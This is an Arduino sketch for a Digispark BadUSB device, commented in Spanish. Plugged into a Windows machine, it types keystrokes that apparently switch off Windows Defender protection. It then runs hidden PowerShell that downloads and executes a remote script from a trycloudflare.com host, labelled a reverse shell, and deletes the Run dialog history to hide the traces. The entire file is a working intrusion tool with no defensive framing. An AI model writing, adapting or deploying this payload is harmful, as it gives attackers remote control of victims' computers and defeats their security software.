#define kbd_es_es
#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0); // No key pressed
  DigiKeyboard.delay(500);

  // Presiona y suelta la tecla de Windows para asegurarte de que el menú de inicio está cerrado
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT); // MOD_GUI_LEFT es la tecla de Windows
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Vuelve a presionar la tecla de Windows para abrir el menú de inicio
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Escribe "Seguridad" (para "Seguridad de Windows" en sistemas en español)
  DigiKeyboard.print("Seguridad");
  DigiKeyboard.delay(1000); // Espera para asegurarte de que la búsqueda se complete

  // Presiona Enter para abrir Windows Defender (Windows Security)
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);

  // Simula la presión de la tecla Tab cuatro veces usando el código de tecla directo
  for (int i = 0; i < 4; i++) {
    DigiKeyboard.sendKeyStroke(43); // 43 es el código para la tecla Tab en dispositivos HID
    DigiKeyboard.delay(500); // Pequeña demora entre cada pulsación de Tab
  }

  // Presiona Enter
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(44);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);

  // Se descarga y se ejecuta la reverse shell 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -windowstyle hidden -nop \"IEX (New-Object Net.WebClient).DownloadString('https://notices-theatre-participation-discipline.trycloudflare.com/PS.ps1');\""); //link del payload  
  DigiKeyboard.delay(1000);

  // se limpia el historial 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue\"");

  // Termina el script después de ejecutarse una vez
  for (;;) {}
}
